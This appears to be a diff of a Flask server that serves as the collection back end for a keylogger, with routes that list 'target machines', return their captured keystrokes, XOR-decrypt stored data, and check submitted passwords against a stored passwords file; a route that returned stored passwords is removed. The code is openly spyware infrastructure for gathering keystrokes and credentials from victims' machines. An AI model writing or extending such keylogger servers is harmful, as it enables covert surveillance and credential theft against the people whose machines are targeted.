@@ -3,10 +3,6 @@ from datetime import datetime
 from flask import Flask, jsonify, request, json
 from flask_cors import CORS
 import time
-import sys
-sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
-from KeyLoggerAgent import encryptor
-
 
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
@@ -64,12 +60,10 @@ def decrypt(key: str, data: str):
     decrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
     return decrypted
 
-
 @app.route('/api/get_target_machines_list', methods=['GET'])
 def get_target_machines_list():
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines}), 200
-
 
 @app.route('/api/get_keystrokes', methods=['GET'])
 def get_target_machine_key_strokes():
@@ -102,12 +96,19 @@ def get_target_machine_key_strokes():
 
     return jsonify({"keystrokes": keystrokes}), 200
 
-@app.route('/api/get_passwords', methods=['GET'])
-def get_passwords():
-    with open('passwords.json', 'r') as f:
-        data = json.load(f)
-    return jsonify(data), 200
-
+@app.route('/api/check_passwords', methods=['POST'])
+def check_passwords():
+    data = request.get_json()
+    print(data)
+    passwords_file_path = os.path.join(os.path.dirname(__file__), 'passwords.json')
+    if not data or "passwords" not in data:
+        return jsonify({"error": "Invalid payload"}), 400
+    with open(passwords_file_path, "r", encoding="utf-8") as f:
+        passwords = json.load(f)
+    print(passwords)
+    if data["passwords"] in passwords.values():
+        return jsonify({"status": "success"}), 200
+    return jsonify({"error": "Password not found"}), 404
 
 if __name__ == '__main__':
     app.run(debug=True)
